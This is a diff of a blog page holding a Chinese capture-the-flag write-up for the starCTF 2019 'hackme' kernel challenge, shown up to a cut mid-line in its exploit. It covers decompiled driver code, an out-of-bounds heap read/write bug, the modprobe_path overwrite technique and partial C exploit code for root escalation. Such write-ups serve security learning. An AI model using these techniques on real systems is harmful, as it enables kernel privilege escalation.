@@ -145,198 +145,263 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">starCTF 2019 hackme</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/ai.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">196082</span>
+                        
+                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-08-10 15:55:21
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/kernel-pwn/">kernel-pwn</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/modprobe-path/">modprobe_path</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.1k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这道题依旧是一道kernel的堆题，题目很简单这里简单分析一下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">hackme_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rax</span></span><br><span class="line">    __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">    __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rax</span></span><br><span class="line">    __int64 v8; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v9; <span class="comment">// rax</span></span><br><span class="line">    __int64 size; <span class="comment">// r12</span></span><br><span class="line">    __int64 content; <span class="comment">// r13</span></span><br><span class="line">    __int64 *v12; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v13; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v14; <span class="comment">// rdi</span></span><br><span class="line">    __int64 *v15; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v16; <span class="comment">// rax</span></span><br><span class="line">    arg v17; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">    copy_from_user(&amp;v17, a3, <span class="number">0x20</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v13 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">        v14 = pool[v13];</span><br><span class="line">        v15 = &amp;pool[v13];</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">        &#123;</span><br><span class="line">            kfree();</span><br><span class="line">            *v15 = <span class="number">0LL</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0x30001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a2 == <span class="number">0x30002</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v7 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v8 = pool[v7];</span><br><span class="line">            v9 = &amp;pool[v7];</span><br><span class="line">            <span class="keyword">if</span> ( v8 &amp;&amp; v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v9[<span class="number">1</span>] )</span><br><span class="line">            &#123;</span><br><span class="line">                copy_from_user(v17.offset + v8, v17.content, v17.size);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0x30003</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = <span class="number">2LL</span> * LODWORD(v17.idx);</span><br><span class="line">            v4 = pool[v3];</span><br><span class="line">            v5 = &amp;pool[v3];</span><br><span class="line">            <span class="keyword">if</span> ( v4 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v17.offset + v17.size &lt;= (<span class="keyword">unsigned</span> __int64)v5[<span class="number">1</span>] )</span><br><span class="line">                &#123;</span><br><span class="line">                    copy_to_user(v17.content, v17.offset + v4, v17.size);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x30000</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    size = v17.size;</span><br><span class="line">    content = v17.content;</span><br><span class="line">    v12 = &amp;pool[<span class="number">2</span> * LODWORD(v17.idx)];</span><br><span class="line">    <span class="keyword">if</span> ( *v12 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v16 = _kmalloc(v17.size, <span class="number">0x6000C0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v16 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    *v12 = v16;</span><br><span class="line">    copy_from_user(v16, content, size);</span><br><span class="line">    v12[<span class="number">1</span>] = size;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> arg struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, mappedto_4)   ; XREF: hackme_ioctl/r</span><br><span class="line"><span class="number">00000000</span> idx dq ?                                ; XREF: hackme_ioctl+<span class="number">46</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; hackme_ioctl:loc_8E/r ...</span><br><span class="line"><span class="number">00000008</span> content dq ?                            ; XREF: hackme_ioctl+<span class="number">51</span>/r</span><br><span class="line"><span class="number">00000008</span>                                         ; hackme_ioctl+<span class="number">99</span>/r ...</span><br><span class="line"><span class="number">00000010</span> size dq ?                               ; XREF: hackme_ioctl+<span class="number">4</span>D/r</span><br><span class="line"><span class="number">00000010</span>                                         ; hackme_ioctl+<span class="number">95</span>/r ...</span><br><span class="line"><span class="number">00000018</span> offset dq ?                             ; XREF: hackme_ioctl+<span class="number">49</span>/r</span><br><span class="line"><span class="number">00000018</span>                                         ; hackme_ioctl+<span class="number">91</span>/r</span><br><span class="line"><span class="number">00000020</span> arg ends</span><br></pre></td></tr></table></figure>
+
+<p>下面是分析出来的结构体，可以看到题目实现了四个较为基本的功能，增加堆块，删除堆块，修改堆块，读取堆块。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里需要注意的对于读写的时候检测offset的方式是 <code>offset+size&lt;(unsigned __int64)size</code> 这里可以看出来存在向上溢出任意地址的读和写。</p>
+<p>kernel使用的堆分配机制是Buddy System和Slab分配器。而Slab分配器是类似于ptmalloc中的fastbin。kmem_cache_cpu中的freelist指向一个slab中第一个空闲的object，接着object存在指针指向后面空闲的object。而这个指针是很类似于fastbin，我们如果修改的话可以实现任意地址分配堆块。</p>
+<h3 id="modprobe-path利用原理"><a href="#modprobe-path利用原理" class="headerlink" title="modprobe_path利用原理"></a>modprobe_path利用原理</h3><p>首先，什么是modprobe呢？根据维基百科的说法：“modprobe是一个Linux程序，最初由Rusty Russell编写，用于在Linux内核中添加一个可加载的内核模块，或者从内核中移除一个可加载的内核模块”。也就是说，它是我们在Linux内核中安装或卸载新模块时都要执行的一个程序。该程序的路径是一个内核全局变量，默认为/sbin/modprobe</p>
+<p>modprobe的路径, 默认是/sbin/modprobe, 存放在内核本身的符号modprobe_path下, 同时，它位于一个可写的内存页中。我们可以通过读取/proc/kallsyms得到它的地址</p>
+<p>其次，当我们执行的文件的类型是系统未知的类型时，将执行modprobe程序（其路径存储在modprobe_path中）。 更准确地说，如果我们对文件签名（又称魔术头）为系统未知的文件调用execve()函数时，它将调用下列函数，并最终调用modprobe</p>
+<p><code>do_execve()</code>=&gt;<code>do_execveat_common()</code>=&gt;<code>bprm_execve()</code>=&gt;<code>exec_binprm()</code>=&gt;<code>search_binary_handler()</code>=&gt;<code>request_module()</code>=&gt;<code>call_modprobe()</code></p>
+<p>所有这些调用最终将执行下面的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">call_modprobe</span><span class="params">(<span class="keyword">char</span> *module_name, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这篇文章中 <a href="https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/">kernel pwn内存任意读写提升权限[2]</a> 提到了call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。然而这个函数的定义可以看出来也是调用了call_usermodehelper_setup和call_usermodehelper_exec，所以猜测这一函数也可以达到一样的效果，结果也证明事实确实如此</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">					 <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>所以我们的思路就是覆盖掉modprobe_path值为我们期望的值即可。</p>
+<p>那么首先还是需要泄露地址，这里泄露堆地址就不再提了，存在向上任意溢出所以随便怎么泄露都可。</p>
+<p>内核基址的读取需要一点猜测的成分在，可知<code>0</code>号内存<code>0xffff88800017a500</code>之前是已经在用的系统块，那么一定存在一些内核的指针。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220810154050545.png"
+                      alt="image-20220810154050545"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220810154112166.png"
+                      alt="image-20220810154112166"
+                ></p>
+<p>可以看到这上面确实存在一个固定函数地址，所以可以跟他计算出基地值。</p>
+<p>虽然我们可以直接泄露出来modprobe_path的地址，并且实现任意分配堆地址分配到指定位置，但是这样会破坏很多周围的数据，我们的想法肯定是值修改modprobe_path的值，所以我们还需要进一步利用。接下来的思路就是将堆块分配到pool上，那么我们就可以篡改pool上的堆指针为modprobe_path的地址，那我们就可以只修改他的值了，那么现在的问题是怎么获取到pool的值呢？</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220810154529735.png"
+                      alt="image-20220810154529735"
+                ></p>
+<p>在mod_tree内存的附近处会存留驱动的地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20220810154831475.png"
+                      alt="image-20220810154831475"
+                ></p>
+<p>所以我们可以任意堆分配到这里然后泄露出驱动地址，紧接着任意堆分配到pool最后修改pool中的指针为modprobe_path地址，最后修改modprobe_path的值即可</p>
+<h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">char</span> *content;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] open /dev/hackme failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> heap_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> kernel_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mod_tree_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> mode_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> pool_addr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> modprobe_path_addr;</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">2</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30000</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    arg.idx = <span class="number">1</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line">    arg.idx = <span class="number">3</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30001</span>, &amp;arg);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x100</span>;</span><br><span class="line">    arg.size = <span class="number">0x100</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    heap_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    arg.idx = <span class="number">0</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span class="number">-0x200</span> + <span class="number">0x28</span>;</span><br><span class="line">    arg.size = <span class="number">0x200</span> - <span class="number">0x28</span>;</span><br><span class="line">    ioctl(fp, <span class="number">0x30003</span>, &amp;arg);</span><br><span class="line">    print_hex(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    kernel_addr = *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf);</span><br><span class="line">    mod_tree_addr = kernel_addr - <span class="number">0x38ae0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)buf) = mod_tree_addr + <span class="number">0x20</span>;</span><br><span class="line">    arg.idx = <span class="number">4</span>;</span><br><span class="line">    arg.content = buf;</span><br><span class="line">    arg.offset = <span 